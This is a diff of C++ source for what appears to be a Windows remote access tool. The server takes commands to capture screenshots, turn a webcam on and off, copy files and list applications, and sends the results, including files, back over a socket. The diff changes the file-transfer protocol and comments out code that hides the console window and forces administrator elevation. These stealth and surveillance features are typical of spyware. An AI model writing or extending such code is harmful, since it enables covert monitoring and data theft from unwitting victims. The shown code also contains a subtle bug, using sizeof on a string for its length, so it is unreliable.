@@ -55,13 +55,13 @@ static void handleRequest(std::string& request, std::string& response, std::stri
 			copyFile(params, response);
 			break;
 		case CAPTURE_SCREENSHOT:
-			captureScreenshot("screenshot.png", response, file);
+			captureScreenshot(response, file);
 			break;
 		case START_WEBCAM:
 			startWebcam(response);
 			break;
 		case STOP_WEBCAM:
-			stopWebcam(response);
+			stopWebcam(response, file);
 			break;
 		case LIST_APPS:
 			listApps(response);
@@ -212,10 +212,17 @@ static void startServer()
 
 			// Send file if it's open
 			if (file.is_open()) {
-				// Send file size first
-				//std::cout << "sth\n";
+				// Send response type
+				send(ClientSocket, "file", 4, 0);
+
+				std::string fileName = filePaths.find(command) != filePaths.end() ? filePaths.at(command) : "unknown";
+
+				// Send file name
+				send(ClientSocket, fileName.c_str(), sizeof(fileName), 0);
+
+				// Send file size
 				file.seekg(0, std::ios::end);
-				int fileSize = static_cast<int>(file.tellg());
+				unsigned long long fileSize = std::filesystem::file_size(fileName);
 				send(ClientSocket, (char*)&fileSize, sizeof(fileSize), 0);
 
 				file.seekg(0, std::ios::beg);  // Rewind the file to start sending
@@ -236,6 +243,9 @@ static void startServer()
 				file.close();
 			}
 			else {
+				// Send response type
+				send(ClientSocket, "text", 4, 0);
+
 				// Send response size first
 				int responseSize = response.size();
 				send(ClientSocket, (char*)&responseSize, sizeof(responseSize), 0);
@@ -280,13 +290,13 @@ static void startServer()
 int main()
 {
 	// Hide console window
-	ShowWindow(GetConsoleWindow(), SW_HIDE);
-	// Comment to debug
-	if (!isElevated()) {
-		// Request for elevation
-		restartAsAdmin();
-		return 0;
-	}
+	//ShowWindow(GetConsoleWindow(), SW_HIDE);
+	//// Comment to debug
+	//if (!isElevated()) {
+	//	// Request for elevation
+	//	restartAsAdmin();
+	//	return 0;
+	//}
 
 
 	std::cout << "Server started." << std::endl;
